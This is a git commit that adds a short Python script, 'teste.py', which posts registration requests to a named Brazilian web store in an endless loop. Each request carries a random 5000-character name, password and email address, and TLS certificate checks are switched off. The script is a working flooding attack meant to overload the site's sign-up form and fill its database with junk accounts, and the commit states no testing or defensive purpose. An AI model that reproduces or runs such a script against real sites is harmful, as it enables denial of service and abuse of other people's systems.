8491b8be30befe79467ff081b84c0dabaac0f266
TheHoltz <38303017+TheHoltz@users.noreply.github.com>
2018-12-03 23:26:39 -0200

    Add files via upload

---
+++ teste.py
@@ -0,0 +1,16 @@
+import requests
+from random import choice
+from string import ascii_lowercase
+
+url = 'https://www.minemarket.com.br/register/'
+
+lis=list(ascii_lowercase)
+
+while(1):
+    ii = ''.join(choice(lis) for _ in range(5000))
+    requests.post(url, allow_redirects=False, verify=False, data={
+        'name': ii,
+        'mail': ii+'@'+'whit3own4.com',
+        'pass': ii
+    })
+    print("Pacote com sucesso: %.15s"%ii);
